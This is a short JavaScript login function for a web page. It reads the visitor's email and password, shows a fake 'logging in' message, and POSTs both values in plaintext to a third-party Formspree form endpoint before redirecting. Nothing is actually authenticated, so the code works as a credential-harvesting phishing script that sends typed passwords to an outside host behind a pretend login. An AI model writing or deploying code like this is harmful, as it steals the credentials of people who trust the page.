function login(){
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

     if (email=="") {
        alert("Unidentified User")
        return;
     }
   
    let btn = document.getElementById("login")
    btn.innerText="logging In...";
    btn.disabled = true;



     document.getElementById("header").textContent = "Welcome 🥳"
    document.getElementById("title").textContent = "Hello"+ " " + email;

fetch("https://formspree.io/f/meagzwvk",{
    method: "POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({email:email,password:password})
});
   
setTimeout(function () {
    alert("Logging you in as" + " " + email)
    btn.innerText="Log In";
    btn.disabled= false;
}, 3000)

     setTimeout( function () {  
    window.location.href="index.html";
     
     },3000);

     
}


